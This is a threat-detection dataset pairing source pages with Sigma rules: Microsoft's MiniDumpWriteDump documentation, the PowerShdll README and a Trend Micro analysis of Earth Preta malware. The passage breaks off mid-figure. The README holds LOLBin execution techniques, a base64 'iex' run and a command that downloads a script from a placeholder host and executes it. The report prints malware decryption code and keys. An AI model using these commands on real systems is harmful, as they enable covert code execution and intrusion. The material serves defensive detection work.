[
  {
    "url": "https://learn.microsoft.com/en-us/windows/win32/api/minidumpapiset/nf-minidumpapiset-minidumpwritedump",
    "markdown": "# MiniDumpWriteDump function (minidumpapiset.h)\n\nWrites user-mode minidump information to the specified file.\n\n## Syntax\n\n```\nBOOL MiniDumpWriteDump(\n  [in] HANDLE                            hProcess,\n  [in] DWORD                             ProcessId,\n  [in] HANDLE                            hFile,\n  [in] MINIDUMP_TYPE                     DumpType,\n  [in] PMINIDUMP_EXCEPTION_INFORMATION   ExceptionParam,\n  [in] PMINIDUMP_USER_STREAM_INFORMATION UserStreamParam,\n  [in] PMINIDUMP_CALLBACK_INFORMATION    CallbackParam\n);\n```\n\n## Parameters\n\n- **[in] hProcess**\n  A handle to the process for which the information is to be generated. This handle must have `PROCESS_QUERY_INFORMATION` and `PROCESS_VM_READ` access to the process. If handle information is to be collected then `PROCESS_DUP_HANDLE` access is also required. For more information, see Process Security and Access Rights. The caller must also be able to get `THREAD_ALL_ACCESS` access to the threads in the process. For more information, see Thread Security and Access Rights.\n\n- **[in] ProcessId**\n  The identifier of the process for which the information is to be generated.\n\n- **[in] hFile**\n  A handle to the file in which the information is to be written.\n\n- **[in] DumpType**\n  The type of information to be generated. This parameter can be one or more of the values from the MINIDUMP_TYPE enumeration.\n\n- **[in] ExceptionParam**\n  A pointer to a MINIDUMP_EXCEPTION_INFORMATION structure describing the client exception that caused the minidump to be generated. If the value of this parameter is `NULL`, no exception information is included in the minidump file.\n\n- **[in] UserStreamParam**\n  A pointer to a MINIDUMP_USER_STREAM_INFORMATION structure. If the value of this parameter is `NULL`, no user-defined information is included in the minidump file.\n\n- **[in] CallbackParam**\n  A pointer to a MINIDUMP_CALLBACK_INFORMATION structure that specifies a callback routine which is to receive extended minidump information. If the value of this parameter is `NULL`, no callbacks are performed.\n\n## Return value\n\nIf the function succeeds, the return value is `TRUE`; otherwise, the return value is `FALSE`. To retrieve extended error information, call GetLastError. Note that the last error will be an `HRESULT` value. If the operation is canceled, the last error code is `HRESULT_FROM_WIN32(ERROR_CANCELLED)`.\n\n## Remarks\n\nThe MiniDumpCallback function receives extended minidump information from `MiniDumpWriteDump`. It also provides a way for the caller to determine the granularity of information written to the minidump file, as the callback function can filter the default information.\n\n`MiniDumpWriteDump` should be called from a separate process if at all possible, rather than from within the target process being dumped. This is especially true when the target process is already not stable. For example, if it just crashed. A loader deadlock is one of many potential side effects of calling `MiniDumpWriteDump` from within the target process. If calling `MiniDumpWriteDump` from a separate process is not possible, then it is advisable to have a dedicated thread whose sole purpose is to call `MiniDumpWriteDump`. This can help ensure that the stack is not already exhausted before the call to `MiniDumpWriteDump`.\n\n`MiniDumpWriteDump` may not produce a valid stack trace for the calling thread. To work around this problem, you must capture the state of the calling thread before calling `MiniDumpWriteDump` and use it as the `ExceptionParam` parameter. One way to do this is to force an exception inside a `__try` / `__except` block and use the EXCEPTION_POINTERS information provided by GetExceptionInformation. Alternatively, you can call the function from a new worker thread and filter this worker thread from the dump.\n\nAll DbgHelp functions, such as this one, are single threaded. Therefore, calls from more than one thread to this function will likely result in unexpected behavior or memory corruption. To avoid this, you must synchronize all concurrent calls from more than one thread to this function.\n\n## Requirements\n\n| Requirement         | Value                                      |\n|---------------------|--------------------------------------------|\n| **Target Platform** | Windows                                    |\n| **Header**          | minidumpapiset.h (include Dbghelp.h)     |\n| **Library**         | Dbghelp.lib                               |\n| **DLL**             | Dbghelp.dll; Dbgcore.dll                  |\n| **Redistributable** | DbgHelp.dll and Dbgcore.dll               |\n\n## See also\n\n- DbgHelp Functions\n- MINIDUMP_CALLBACK_INFORMATION\n- MINIDUMP_EXCEPTION_INFORMATION\n- MINIDUMP_USER_STREAM_INFORMATION\n- MiniDumpCallback\n- MiniDumpReadDumpStream",
    "sigma_rule": {
      "title": "Suspicious Unsigned Dbghelp/Dbgcore DLL Loaded",
      "id": "bdc64095-d59a-42a2-8588-71fd9c9d9abc",
      "related": [
        {
          "id": "0e277796-5f23-4e49-a490-483131d4f6e1",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects the load of dbghelp/dbgcore DLL (used to make memory dumps) by suspicious processes.\nTools like ProcessHacker and some attacker tradecract use MiniDumpWriteDump API found in dbghelp.dll or dbgcore.dll.\nAs an example, SilentTrynity C2 Framework has a module that leverages this API to dump the contents of Lsass.exe and transfer it over the network back to the attacker's machine.\n",
      "references": [
        "https://learn.microsoft.com/en-us/windows/win32/api/minidumpapiset/nf-minidumpapiset-minidumpwritedump",
        "https://www.pinvoke.net/default.aspx/dbghelp/MiniDumpWriteDump.html",
        "https://medium.com/@fsx30/bypass-edrs-memory-protection-introduction-to-hooking-2efb21acffd6"
      ],
      "author": "Perez Diego (@darkquassar), oscd.community, Ecco",
      "date": "2019-10-27",
      "modified": "2022-12-09",
      "tags": [
        "attack.credential-access",
        "attack.t1003.001"
      ],
      "logsource": {
        "category": "image_load",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "ImageLoaded|endswith": [
            "\\dbghelp.dll",
            "\\dbgcore.dll"
          ],
          "Signed": "false"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\image_load\\image_load_dll_dbghelp_dbgcore_unsigned_load.yml",
    "id": "1"
  },
  {
    "url": "https://github.com/p3nt4/PowerShdll",
    "markdown": "# PowerShdll\n\nRun PowerShell with dlls only.\nDoes not require access to powershell.exe as it uses powershell automation dlls.\nPowerShdll can be run with: rundll32.exe, installutil.exe, regsvcs.exe, regasm.exe, regsvr32.exe or as a standalone executable.\n\n## dll mode:\n\n### Rundll32:\n```\nUsage:\nrundll32 PowerShdll,main <script>\nrundll32 PowerShdll,main -h      Display this message\nrundll32 PowerShdll,main -f <path>       Run the script passed as argument\nrundll32 PowerShdll,main -w      Start an interactive console in a new window (Default)\nrundll32 PowerShdll,main -i      Start an interactive console in this console\nIf you do not have an interractive console, use -n to avoid crashes on output\n```\n\n### Alternatives (Credit to SubTee for these techniques):\n```\n1.\n    x86 - C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U PowerShdll.dll\n    x64 - C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.3031964\\InstallUtil.exe /logfile= /LogToConsole=false /U PowerShdll.dll\n2.\n    x86 C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regsvcs.exe PowerShdll.dll\n    x64 C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\regsvcs.exe PowerShdll.dll\n3.\n    x86 C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regasm.exe /U PowerShdll.dll\n    x64 C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\regasm.exe /U PowerShdll.dll\n4.\n    regsvr32 /s  /u PowerShdll.dll -->Calls DllUnregisterServer\n    regsvr32 /s PowerShdll.dll --> Calls DllRegisterServer\n```\n\n## exe mode\n```\nUsage:\nPowerShdll.exe <script>\nPowerShdll.exe -h      Display this message\nPowerShdll.exe -f <path>       Run the script passed as argument\nPowerShdll.exe -i      Start an interactive console in this console (Default)\n```\n\n## Embeded payloads\nPayloads can be embeded by modifying the \"payload\" variable in the start method of the common.cs file. If a payload is embeded, all other varguments will be ignored and the payload will be executed upon running PowerShdll.\n\n## Examples\n\n### Run base64 encoded script\n```\nrundll32 Powershdll.dll,main [System.Text.Encoding]::Default.GetString([System.Convert]::FromBase64String(\"BASE64\")) ^| iex\n```\nNote: Empire stagers need to be decoded using [System.Text.Encoding]::Unicode\n\n### Download and run script\n```\nrundll32 PowerShdll.dll,main . { iwr -useb https://website.com/Script.ps1 } ^| iex;\n```\n\n## Requirements\n- .Net v3.5 for dll mode.\n- .Net v2.0 for exe mode.\n\n## Known Issues\nSome errors do not seem to show in the output. May be confusing as commands such as Import-Module do not output an error on failure.\nMake sure you have typed your commands correctly.\nIn dll mode, interractive mode and command output rely on hijacking the parent process' console. If the parent process does not have a console, use the -n switch to not show output otherwise the application will crash.\nDue to the way Rundll32 handles arguments, using several space characters between switches and arguments may cause issues. Multiple spaces inside the scripts are okay.\n\n## Disclaimer\nThis project is intended for security researchers and penetration testers and should only be used with the approval of system owners.",
    "sigma_rule": {
      "title": "PowerShell Core DLL Loaded By Non PowerShell Process",
      "id": "092bc4b9-3d1d-43b4-a6b4-8c8acd83522f",
      "related": [
        {
          "id": "867613fb-fa60-4497-a017-a82df74a172c",
          "type": "obsolete"
        },
        {
          "id": "fe6e002f-f244-4278-9263-20e4b593827f",
          "type": "obsolete"
        }
      ],
      "status": "test",
      "description": "Detects loading of essential DLLs used by PowerShell by non-PowerShell process.\nDetects behavior similar to meterpreter's \"load powershell\" extension.\n",
      "references": [
        "https://adsecurity.org/?p=2921",
        "https://github.com/p3nt4/PowerShdll"
      ],
      "author": "Tom Kern, oscd.community, Natalia Shornikova, Tim Shelton, Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research)",
      "date": "2019-11-14",
      "modified": "2024-01-17",
      "tags": [
        "attack.t1059.001",
        "attack.execution"
      ],
      "logsource": {
        "category": "image_load",
        "product": "windows"
      },
      "detection": {
        "selection": [
          {
            "Description": "System.Management.Automation"
          },
          {
            "OriginalFileName": "System.Management.Automation.dll"
          },
          {
            "ImageLoaded|endswith": [
              "\\System.Management.Automation.dll",
              "\\System.Management.Automation.ni.dll"
            ]
          }
        ],
        "filter_main_generic": {
          "Image|endswith": [
            ":\\Program Files\\PowerShell\\7\\pwsh.exe",
            ":\\Windows\\System32\\dsac.exe",
            ":\\WINDOWS\\System32\\RemoteFXvGPUDisablement.exe",
            ":\\Windows\\System32\\runscripthelper.exe",
            ":\\WINDOWS\\System32\\sdiagnhost.exe",
            ":\\Windows\\System32\\ServerManager.exe",
            ":\\Windows\\System32\\SyncAppvPublishingServer.exe",
            ":\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell_ise.exe",
            ":\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            ":\\Windows\\System32\\winrshost.exe",
            ":\\Windows\\System32\\wsmprovhost.exe",
            ":\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell_ise.exe",
            ":\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe",
            ":\\Windows\\SysWOW64\\winrshost.exe",
            ":\\Windows\\SysWOW64\\wsmprovhost.exe"
          ]
        },
        "filter_main_dotnet": {
          "Image|contains": [
            ":\\Windows\\Microsoft.NET\\Framework\\",
            ":\\Windows\\Microsoft.NET\\Framework64\\"
          ],
          "Image|endswith": "\\mscorsvw.exe"
        },
        "filter_optional_sql_server_mgmt": {
          "Image|contains": [
            ":\\Program Files (x86)\\Microsoft SQL Server Management Studio",
            ":\\Program Files\\Microsoft SQL Server Management Studio"
          ],
          "Image|endswith": "\\IDE\\Ssms.exe"
        },
        "filter_optional_sql_server_tools": {
          "Image|contains": [
            ":\\Program Files (x86)\\Microsoft SQL Server\\",
            ":\\Program Files\\Microsoft SQL Server\\"
          ],
          "Image|endswith": "\\Tools\\Binn\\SQLPS.exe"
        },
        "filter_optional_citrix": {
          "Image|endswith": "\\Citrix\\ConfigSync\\ConfigSyncRun.exe"
        },
        "filter_optional_vs": {
          "Image|contains": [
            ":\\Program Files (x86)\\Microsoft Visual Studio\\",
            ":\\Program Files\\Microsoft Visual Studio\\"
          ]
        },
        "filter_optional_chocolatey": {
          "Image|contains": ":\\ProgramData\\chocolatey\\choco.exe"
        },
        "filter_optional_nextron": {
          "Image|contains": ":\\Windows\\Temp\\asgard2-agent\\",
          "Image|endswith": [
            "\\thor64.exe",
            "\\thor.exe"
          ]
        },
        "filter_optional_aurora": {
          "Image": null
        },
        "condition": "selection and not 1 of filter_main_* and not 1 of filter_optional_*"
      },
      "falsepositives": [
        "Used by some .NET binaries, minimal on user workstation.",
        "Used by Microsoft SQL Server Management Studio"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\image_load\\image_load_dll_system_management_automation_susp_load.yml",
    "id": "13"
  },
  {
    "url": "https://www.trendmicro.com/en_us/research/23/c/earth-preta-updated-stealthy-strategies.html",
    "markdown": "# Pack it Secretly: Earth Preta’s Updated Stealthy Strategies\n\n**APT & Targeted Attacks** \n**Date:** March 23, 2023 \n\n---\n\nEarth Preta has actively been changing its tools, tactics, and procedures (TTPs) to bypass security solutions. In this blog entry, we will introduce and analyze the tools and malware used by the threat actor in its most recent campaigns.\n\n---\n\n## Infection chain\n\nIn our previous research, we disclosed and analyzed a new campaign initiated by the threat actor group Earth Preta (aka Mustang Panda). In a more recent campaign we’ve been tracking, we discovered Earth Preta delivering lure archives via spear-phishing emails and Google Drive links. After months of investigation, we found that several undisclosed malware and interesting tools used for exfiltration purposes were used in this campaign. We also observed that the threat actors were actively changing their tools, tactics, and procedures (TTPs) to bypass security solutions. In this blog entry, we will introduce and analyze the other tools and malware used by Earth Preta.\n\n### Infection chain\n\nAs we previously mentioned in our past blog entry, the entire attack begins with a spear-phishing email. After a long-term investigation into the attack routine, we’ve determined that the full infection chain works as follows:\n\n```image\nAlt: Figure 1. The full infection chain\nDescription: The image depicts a flowchart outlining the infection chain of a cyber attack, categorized into six stages: Arrival vectors, Discovery, Privilege escalation, Lateral movement, Command and control (C&C), and Exfiltration. Each stage includes specific tools or methods used in the attack. For example, under 'Arrival vectors,' tools like PUBLOAD, TONEINS, and Cobalt Strike are listed. The visual representation employs a color gradient to differentiate between stages and uses arrows to indicate the progression of the attack.\nTranscription: |\n  Arrival vectors\n  - PUPLOAD\n  - TONEINS\n  - TONESHELL\n  - Cobalt Strike\n  - QMAGENT\n  \n  Discovery\n  - net.exe\n  \n  Privilege escalation\n  - ABPass\n  - OCPass\n  - SilentCleanup\n  \n  Lateral movement\n  - HIUPAN\n  - AONSHELL\n  \n  Command and control (C&C)\n  - powershell.exe\n  - certutil.exe\n  - OLEXEO\n  - COOLCLIENT\n  - TROOLIENT\n  - Other shellcode loaders\n  \n  Exfiltration\n  - curl\n  - WINRAR\n  - NUPAKAGE\n  - ZPACKAGE\n  \n  © 2023 TREND MICRO\n```\n\n*Figure 1. The full infection chain*\n\nWe categorize the different TTPs into six stages: arrival vectors, discovery, privilege escalation, lateral movement, command and control (C&C), and exfiltration, respectively. In our previous research, we covered most of the new TTPs and malware during the first stage, arrival vectors. However, we observed that some of the TTPs have been changed. In the following sections, we focus on the updated arrival vectors and their succeeding stages.\n\n---\n\n## Arrival vectors\n\nWe previously summarized the arrival vectors used by Earth Preta by categorizing them into three types (DLL sideloading, shortcut links, and fake file extensions). Starting in October and November 2022, we observed that the threat actors began changing their TTPs to deploy the TONEINS, TONESHELL, and PUBLOAD malware. We believe that the threat actors are employing these new techniques to avoid detection.\n\n### Trojan.Win32.TONEINS\n\nBased on our earlier observation, the TONEINS and TONESHELL malware were downloaded from the Google Drive link embedded in the body of an email. To bypass email-scanning services and email gateway solutions, the Google Drive link has now been embedded in a lure document. The document lures users into downloading a malicious password-protected archive with the embedded link. The files can then be extracted inside via the password provided in the document. By using this technique, the malicious actor behind the attack can successfully bypass scanning services.\n\n```image\nAlt: Figure 2. A lure document (allegedly concerning the government-related Myanmar Sustainable Development Plan) embedded with a Google Drive link and a password\nDescription: The image depicts a lure document purportedly related to the Myanmar Sustainable Development Plan. It features a government emblem at the top and contains text in an Asian script (likely Burmese) that includes a Google Drive link for downloading a password-protected archive. The document instructs the reader on how to extract passwords, indicating its malicious intent. This document serves as a phishing attempt to bypass email scanning services by embedding a link in a seemingly legitimate context.\nTranscription: |\n  မြန်မာနိုင်ငံ\n  မြန်မာနိုင်ငံ၏ အဆင့်မြှင့်တင်ရေး အစီအစဉ်\n  အစီအစဉ်\n  သမိုင်းနှစ် ၂၀၀၀ မှ ၂၀၂၀ အထိ\n  နှစ် ၂၀၂၀ မှ ၂၀၂၅ အထိ\n  \n  အကြောင်းအရာများ\n  အမျိုးသားစီမံကိန်းများနှင့် အစီအစဉ်များကို အကောင်အထည်ဖော်ရန် လိုအပ်သော အချက်အလက်များ\n  \n  မြန်မာနိုင်ငံ၏\n  မြန်မာနိုင်ငံ၏ တိုးတက်မှုဆိုင်ရာ အစီအစဉ် (Myanmar Sustainable Development Plan-MSDP)\n  လင့်ခ်\n  https://drive.google.com/uc?id=17D9_qOHQd9a-wiKeJL8oWs-8j-WAMGSQ&export=download\n  (Extracting passwords: 09-11-2022)\n```\n\n*Figure 2. A lure document (allegedly concerning the government-related Myanmar Sustainable Development Plan) embedded with a Google Drive link and a password*\n\nFor the new arrival vector, the whole infection flow has been changed to the procedure shown in Figure 3.\n\n```image\nAlt: Figure 3. Infection flow for the new arrival vector\nDescription: The image is a detailed flowchart illustrating the infection process for a malware attack. It shows how a lure document, labeled 'Letter Head.docx', contains an embedded link that leads to a download. This download results in a malicious password-protected archive labeled 'List of terrorist personnel at the border.rar'. The flowchart outlines various components, including executable files and libraries, and describes the installation, decryption, and renaming processes involved in executing the malware. Additionally, it indicates a connection to a backdoor command and control (C&C) server.\nTranscription: |\n  Embedded link\n     ↓\n  Downloads\n     ↓\n  Letter Head.docx\n     ↓\n  List of terrorist personnel at the border.rar\n     ↓\n  ┌────────────────────┐\n  │                    │\n  │  $Evidence         │\n  │  information.docx  │\n  │                    │\n  └────────────────────┘\n     ↓\n  ┌──────────────────────────────────┐\n  │                                  │\n  │  List of terrorist personnel at  │\n  │  the border.exe                  │\n  │                                  │\n  └──────────────────────────────────┘\n     ↓\n  ┌──────────────┐\n  │              │\n  │  libcef.dll  │\n  │              │\n  └──────────────┘\n     ↓\n  Installs, decrypts, and renames\n     ↓\n  ┌──────────────────────┐\n  │                      │\n  │  IntelCpHDCPsvc.exe  │\n  │                      │\n  └──────────────────────┘\n     ↓\n  ┌───────────────┐\n  │               │\n  │  coreclr.dll  │\n  │               │\n  └───────────────┘\n     ↓\n     Connects\n     ↓\n  Backdoor C&C\n     ↓\n  User\n  \n  © 2023 TREND MICRO\n```\n\n*Figure 3. Infection flow for the new arrival vector*\n\n---\n\n### Table 1. Files in the new arrival vector\n\n| **File name**                                                                                  | **Detection name**       | **Description**                                        |\n| ---------------------------------------------------------------------------------------------- | ------------------------ | ------------------------------------------------------ |\n| *Letter Head.docx*                                                                             |                          | Decoy document with Google Drive link                  |\n| **List of terrorist personnel at the border.rar** (all entries below are part of this archive) |                          |                                                        |\n| *List of terrorist personnel at the border.exe*                                                |                          | First-stage legitimate executable for DLL sideloading  |\n| *libcef.dll*                                                                                   | Trojan.Win32.TONEINS     | First-stage malware                                    |\n| *~$Evidence information.docx*                                                                  |                          | Second-stage legitimate executable for DLL sideloading |\n| *~$List of terrorist personnel at the border.docx*                                             | Backdoor.Win32.TONESHELL | Second-stage malware                                   |\n| *Internal Letter.docx*                                                                         |                          | Decoy document                                         |\n| *Letter Head.docx*                                                                             |                          | Decoy document                                         |\n\n---\n\nAfter analyzing the downloaded archive, we discovered it to be a malicious RAR file with the TONEINS malware *libcef.dll* and the TONESHELL malware *~List of terrorist personnel at the border.docx*. The infection flow for these is similar to the arrival vector type C in our previous report, with the only difference being that the fake .docx files have XOR-encrypted content to prevent detection. For example, *~$Evidence information.docx* is a file disguising itself as an Office Open XML document. As such, it seems harmless and can even be opened by using decompression software such as 7-Zip.\n\nWe found that the threat actors have hidden a PE file in one of the archive’s ZIPFILERECORD structures. The TONEINS malware, *libcef.dll*, will decrypt this file with a single byte in XOR operations, find the PE header, and drop the payload to the specified path.\n\n```image\nAlt: Figure 4. A PE file is revealed after decrypting the frData member in the last ZIPFILECECORD structure.\nDescription: The image displays a screenshot from a file extraction process using a decompression tool. It shows hex data on the left side, representing the contents of a ZIP file named 'Evidence information.docx.zip'. The highlighted section outlines a specific ZIPFILE record, with details about the embedded 'document.xml'. On the right side, there is a progress bar indicating the extraction process, showing a total size of 182 KB, along with warnings about extra data and a data error related to 'word/document.xml'.\nTranscription: |\n  =Evidence information.docx.zip\n  ---------------------------------------\n  | 0123456789ABCDEF                    |\n  | 00 00 00 00 00 00 00 00 00 00 00 00 |\n  | 00 00 00 00 00 00 00 00 00 00 00 00 |\n  | 00 00 00 00 00 00 00 00 00 00 00 00 |\n  | 00 00 00 00 00 00 00 00 00 00 00 00 |\n  | 00 00 00 00 00 00 00 00 00 00 00 00 |\n  | 00 00 00 00 00 00 00 00 00 00 00 00 |\n  | 00 00 00 00 00 00 00 00 00 00 00 00 |\n  | 00 00 00 00 00 00 00 00 00 00 00 00 |\n  | 00 00 00 00 00 00 00 00 00 00 00 00 |\n  ---------------------------------------\n  |  word/document.xml                  |\n  ---------------------------------------\n  | struct ZIPFILERECORD record[0]      |\n  | Value:                              |\n  | Start:  41Dh                        |\n  | Size:   333h                        |\n  | struct ZIPFILERECORD record[1]      |\n  | Value:                              |\n  | Start:  42h                         |\n  | Size:   11h                         |\n  | struct ZIPFILERECORD record[2]      |\n  | Value:                              |\n  | Start:  A24h                        |\n  | Size:   6D97h                       |\n  | char rFileName[17]                  |\n  | Start:  A42h                        |\n  | Size:   11h                         |\n  | uchar rData[28008]                  |\n  | Start:  A53h                        |\n  | Size:   6D68h                       |\n  ---------------------------------------\n  Extraction Progress:\n  ---------------------------------------\n  Elapsed time: 00:00:00\n  Remaining time: 00:00:00\n  Files: 4\n  Processed: 182 K\n  Total size: 182 K\n  Speed: 11 MB/s\n  Compression ratio: 15%\n  Errors: 2\n  Compressed size: 29152\n  \n  Warnings:\n  There are some data after the end of the payload data\n  Data error: word/document.xml\n```\n\n*Figure 4. A PE file is revealed after decrypting the frData member in the last ZIPFILECECORD structure.*\n\n```image\nAlt: Figure 5. The decryption function of TONEINS\nDescription: The image displays code snippets that illustrate the decryption functions used by the TONEINS malware. The left part of the image shows a segment of code that checks the file type and calls the appropriate XOR decryption function based on whether the file is an executable or a DLL. The right sections show the actual implementations of the `f_do_xor_for_exe` and `f_do_xor_for_dll` functions, which perform XOR operations on the file buffer with specific byte values (0x62 for executables and 0x63 for DLLs) to decrypt the data. This technical detail is crucial for understanding the malware's behavior and infection flow.\nTranscription: |\n  CloseHandle(hFile);\n  if ( file_type )\n      f_do_xor_for_exe_10001100((int)lpBuffer, nNumberOfBytesToRead); // if file_type == 1:\n      // xor 0x62 for exe\n  else\n      f_do_xor_for_dll_10001150((int)lpBuffer, nNumberOfBytesToRead); // xor 0x63 for dll\n  \n  unsigned int __cdecl f_do_xor_for_exe_10001100(int a1, unsigned int a2)\n  {\n      unsigned int result; // eax\n      unsigned int i; // [esp+0h] [ebp-4h]\n      for ( i = 0; ; ++i )\n      {\n          result = i;\n          if ( i >= a2 )\n              break;\n          (*(BYTE *)(a1 + i)) ^= 0x62u;\n      }\n      return result;\n  }\n  \n  unsigned int __cdecl f_do_xor_for_dll_10001150(int a1, unsigned int a2)\n  {\n      unsigned int result; // eax\n      unsigned int i; // [esp+0h] [ebp-4h]\n      for ( i = 0; ; ++i )\n      {\n          result = i;\n          if ( i >= a2 )\n              break;\n          (*(BYTE *)(a1 + i)) ^= 0x63u;\n      }\n      return result;\n  }\n```\n\n*Figure 5. The decryption function of TONEINS*\n\nThe succeeding behaviors of the infection flow are generally the same as those in our previous analysis, where we provide more details.\n\n---\n\n### Trojan.Win32.PUBLOAD\n\nIn more recent cases, the malware PUBLOAD was also being delivered through Google Drive links embedded in decoy documents.\n\n```image\nAlt: Figure 6. The lure document Invitation letter from the US embassy.docx\nDescription: The image depicts a document that appears to be an invitation letter from the U.S. Embassy in Rangoon. It includes a message about sending an invitation and agenda for a coup meeting scheduled for November 20, 2022. The document contains a link to a Google Drive file for downloading, which may be related to the invitation. The layout is simple, featuring text with the embassy's name at the top and clear instructions to join the meeting via a Zoom application.\nTranscription: |\n  U.S. EMBASSY Rangoon:  \n  We would like to send the invitation letter and agenda for the 0201-2022 coup meeting which will be held on 11-20-2022 (Thursday).  \n  Please see the attached file and join the meeting via zoom application.  \n  https://drive.google.com/uc?id=1tyBkJ8gkaQXShYZG53jXwygj5TiVMvNK&export=download\n```\n\n*Figure 6. The lure document Invitation letter from the US embassy.docx*\n\nSince October 2022, we have been observing a new variant of PUBLOAD, which uses the spoofed HTTP header to transfer the data, as LAC’s report also discusses. In contrast to the previous PUBLOAD variant, it prepends an HTTP header with a legitimate-looking host name to the packets. We believe that the threat actors are trying to conceal malicious data among normal traffic. The data in the HTTP body is the same as the past variant, which has the same magic bytes *17 03 03* and the encrypted victim information. We were able to successfully retrieve the payload from a live C&C server and were therefore able to continue our analysis.\n\n```image\nAlt: Figure 7. C&C traffic of the PUBLOAD HTTP variant\nDescription: The image contains a screenshot of HTTP POST request traffic, showing details of the communication involving a malware variant called PUBLOAD. It displays the HTTP headers, including the host, user agent, and accepted content types. Notably, it highlights specific byte sequences such as '17 03 03' which are relevant to the malware's data transfer mechanism. The image also includes a representation of the encoded data and potential payloads, indicating the method by which the malware conceals its activity within normal traffic.\nTranscription: |\n  POST / HTTP/1.1\n  Host: www.asia.microsoft.com\n  Upgrade-Insecure-Requests: 1\n  User-Agent: Mozilla/5.0 (Windows NT 6.1; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36\n  Accept: text/html,image/webp,image/apng,*/*;q=0.8\n  Accept-Encoding: gzip, deflate\n  Accept-Language: en-US,en;q=0.9\n  Content-Length: 39\n  \n  ...* g.e9g....i.f......7.e83K.9}\n  HTTP/1.1 200 OK\n  Server: JSP372.0.14\n  Referrer-Policy: origin-when-cross-origin\n  Accept-Ranges: bytes\n  Content-Type: text/html; charset=utf-8\n  Content-Encoding: gzip\n  Vary: Accept-Encoding\n  Strict-Transport-Security: max-age=2592000; includeSubDomains; preload\n  Content-Length: 16942\n  \n  ...B)...5...J...('..I.t...B..J]...\n  .:e[DH..&....*..NS...|g..d...a.Y...ZO...X.R.../d...<D...p.<Z./\n  65 53 72 65 73 3b 70 72 72 65 72 65 6c 65 61 65\n  66 66 67 61 43 6f 6e 74 65 6e 74 4c 65 6e 67 74\n  16 942....B)...5...J...('..I.t...B..J]...e[DH|&..*..NS...\n```\n\n*Figure 7. C&C traffic of the PUBLOAD HTTP variant*\n\nOnce the payload is received, it will check if the first three magic bytes are *17 03 03* and if the following two bytes are the size of payload. It will then decrypt the encrypted payload with the predefined RC4 key *78 5A 12 4D 75 14 14 11 6C 02 71 15 5A 73 05 08 70 14 65 3B 64 42 22 23 20 00 00 00 00 00 00 00*, which is the same as the one used in the PUBLOAD loader.\n\n```image\nAlt: Figure 8. The first payload retrieved from the PUBLOAD HTTP variant\nDescription: The image displays a hexadecimal dump of data related to a malware payload analysis. It includes labeled sections for 'magic bytes' and 'size,' which indicate the structure of the data being analyzed. The dump provides hexadecimal values in a grid format, with a column showing ASCII representations of the data. The term 'encrypted payload' is prominently highlighted in the middle of the image, drawing attention to the payload's function in the context of the analysis.\nTranscription: |\n  Address    Hex\n  00300000   17 03 03 42 29 2C D8 35 OF A1 A6 5D 55 F8 2C\n  00300010   CA A3 83 0D 7D A9 A2 65 58 44 A4 26 16 B5 20\n  00300020   CC BC A0 2C D3 F4 2A ED A8 7C 64 99 6A CE 2C\n  00300030   FE 87 3C 1E 44 9E 3B 1A 76 36 07 10 07 22 1A\n  00300040   E3 5E 57 A4 5A 37 AE 2B 40 1B 77 B6 9F 26 0A\n  00300050   6B 6C A6 AC 5B 41 AC 5C 6E 6C 6A 41 A4 5D 55\n  00300060   4A 43 4A 53 DE 55 55 5B 41 4F 5D 6C 6A 41 5C\n  00300070   6E 6C 6A 41 5C 6E 6C 6A 41 5C 6E 6C 6A 41 5C\n  encrypted payload\n```\n\n*Figure 8. The first payload retrieved from the PUBLOAD HTTP variant*\n\nAfter decryption, it then checks if the first byte of the decrypted payload is *0x06*. The decrypted payload contains another payload that is XOR-encrypted with the bytes *23 BE 84 E1 6C D6 AE 52 90*.\n\n```image\nAlt: Figure 9. The second payload retrieved from the PUBLOAD HTTP variant\nDescription: The image displays a hex dump of an encrypted payload, with specific sections highlighted. It shows memory addresses, hexadecimal values, the ASCII representation of those values, and an XOR key highlighted in yellow. The term 'encrypted payload' is prominently noted in the center, indicating that the data represented is related to the encrypted payload mentioned in the CTI content.\nTranscription: |\n  Address    Hex                             XOR key                      ASCII\n  002D0062   06 09 00 00 23 BE 84 E1 6C D6 AE 52 90 00 00 00\n  002D0072   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  002D0082   00 00 00 42 00 00 00 00 00 00 00 00 00 00 00 00\n  002D0092   06 1B 6E E9 E7 83 3F 27 D4 ED 68 61 B8 DB 20 C9\n  002D00A2   9E A6 D9 C5 3F 27 D4 ED 63 61 6C 9E 5C 5A 5C 5F\n  002D00B2   B0 84 95 9A AF 90 13 84 6A 29 FE 72 48 2D A0 00\n  002D00C2   72 48 2D A0 1E 2A 6A 29 FE 72 48 2D A0 00 00 00\n  002D00D2   90 13 84 6A 29 FE 72 48 2D A0 00 00 00 00 00 00\n  002D00E2   25 17 6C A8 D9 22 A0 1A FB D9 7C 72 35 C1 E9\n```\n\n*Figure 9. The second payload retrieved from the PUBLOAD HTTP variant*\n\nAfter this is decrypted, there is yet another final backdoor payload that supports data upload and command execution.\n\n```image\nAlt: Figure 10. The final payload of the PUBLOAD HTTP variant\nDescription: The image displays a hex dump of a decrypted payload, showing the memory addresses, hexadecimal representation of the data, and the corresponding ASCII characters. The hex values are organized in columns, with notable patterns and a highlighted label 'decrypted payload' indicating the significance of the section. This format is commonly used in cybersecurity analysis to inspect the contents of malware payloads.\nTranscription: |\n  Address    Hex                                         ASCII\n  002D0062   06 09 00 23 BE 84 E1 6C D6 AE 52 90 00 00 00 00   ....#...l..R....\n  